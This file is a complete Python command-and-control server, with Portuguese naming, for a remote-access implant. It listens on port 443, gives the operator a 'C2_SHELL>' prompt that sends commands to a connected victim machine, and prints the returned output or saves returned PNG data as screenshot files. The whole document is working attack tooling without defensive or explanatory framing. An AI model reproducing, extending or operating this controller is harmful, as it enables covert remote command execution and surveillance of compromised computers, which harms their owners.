import socket
import sys
import struct
import threading

LISTEN_IP = "0.0.0.0"
PORT = 443

def receber_bytes_exatos(client_socket, tamanho_esperado):
    dados_acumulados = b""
    while len(dados_acumulados) < tamanho_esperado:
        bytes_restantes = tamanho_esperado - len(dados_acumulados)
        pacote = client_socket.recv(bytes_restantes)
        if not pacote:
            raise ConnectionResetError("Conexão fechada pelo cliente.")
        dados_acumulados += pacote
    return dados_acumulados

def ler_mensagem_do_protocolo(client_socket):
    bytes_do_tamanho = receber_bytes_exatos(client_socket, 4)
    tamanho_do_payload = struct.unpack(">I", bytes_do_tamanho)[0]
    payload_bruto = receber_bytes_exatos(client_socket, tamanho_do_payload)
    return payload_bruto

def receive_handler(client_socket):
    while True:
        try:
            payload = ler_mensagem_do_protocolo(client_socket)
            
            if payload.startswith(b'\x89PNG\r\n\x1a\n'):
                nome_arquivo = f"screenshot_{threading.get_ident()}.png"
                with open(nome_arquivo, "wb") as f:
                    f.write(payload)
                print(f"\n[+] Imagem salva: {nome_arquivo} ({len(payload)} bytes).\nC2_SHELL> ", end="", flush=True)
            else:
                texto_recebido = payload.decode("utf-8", errors="replace")
                print(f"\n{texto_recebido}\nC2_SHELL> ", end="", flush=True)
                
        except socket.timeout:
            continue
        except ConnectionResetError as e_reset:
            print(f"\n[-] Conexão resetada: {e_reset}")
            break
        except struct.error as e_struct:
            print(f"\n[!] Erro estrutural nos dados do cabeçalho: {e_struct}")
            break
        except OSError as e_os:
            print(f"\n[-] Erro de E/S no socket: {e_os}")
            break

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((LISTEN_IP, PORT))
        server.listen(1)
        print(f"[*] Listening on {LISTEN_IP}:{PORT}...")
    except OSError as e_bind:
        print(f"[!] Erro no bind na porta {PORT}: {e_bind}")
        sys.exit(1)
        
    try:
        client_socket, client_address = server.accept()
        print(f"[+] Conexão aceita de {client_address[0]}:{client_address[1]}")
        
        client_socket.settimeout(1.0)
        
        recv_thread = threading.Thread(target=receive_handler, args=(client_socket,), daemon=True)
        recv_thread.start()
        
        while True:
            try:
                command = input("C2_SHELL> ").strip()
                if not command:
                    continue
                    
                cabecalho = struct.pack(">I", len(command.encode("utf-8")))
                client_socket.sendall(cabecalho + command.encode("utf-8"))
                
                if command == "/exit":
                    print("[*] Closing connection.")
                    break
            except KeyboardInterrupt:
                break
            except OSError as e_envio:
                print(f"[-] Erro de envio: {e_envio}")
                break
                    
    finally:
        server.close()

if __name__ == "__main__":
    start_server()
